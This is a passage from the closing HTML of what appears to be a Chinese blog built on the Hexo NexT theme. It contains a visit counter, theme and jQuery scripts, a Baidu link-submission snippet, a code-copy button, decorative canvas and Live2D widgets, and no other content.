class="post-meta-item-icon"><i class="fa fa-s"></i> </span><span class="site-pv" title="总访问量"><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer></div><script>"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script color="255,105,180" opacity="0.6" zindex="-1" count="77" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/jquery/index.js?v=2.1.3"></script><script src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script src="/js/utils.js?v=7.1.0"></script><script src="/js/motion.js?v=7.1.0"></script><script src="/js/affix.js?v=7.1.0"></script><script src="/js/schemes/pisces.js?v=7.1.0"></script><script src="/js/scrollspy.js?v=7.1.0"></script><script src="/js/post-details.js?v=7.1.0"></script><script src="/js/next-boot.js?v=7.1.0"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script>$(".highlight").each(function(e,t){var n=$("<div>").addClass("highlight-wrap");$(t).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(e){var t=$(this).parent().find(".code").find(".line").map(function(e,t){return $(t).text()}).toArray().join("\n"),n=document.createElement("textarea"),o=window.pageYOffset||document.documentElement.scrollTop;n.style.top=o+"px",n.style.position="absolute",n.style.opacity="0",n.readOnly=!0,n.value=t,document.body.appendChild(n),n.select(),n.setSelectionRange(0,t.length),n.readOnly=!1;document.execCommand("copy");n.blur(),$(this).blur()})).on("mouseleave",function(e){var t=$(this).find(".copy-btn");setTimeout(function(){t.text("复制")},300)}).append(t)})</script><script type="text/javascript" color="0,191,255" opacity="1" zindex="-2" count="60" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/clicklove.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/z16.model.json"},display:{position:"right",width:210,height:420},mobile:{show:!0},log:!1})</script></body></html>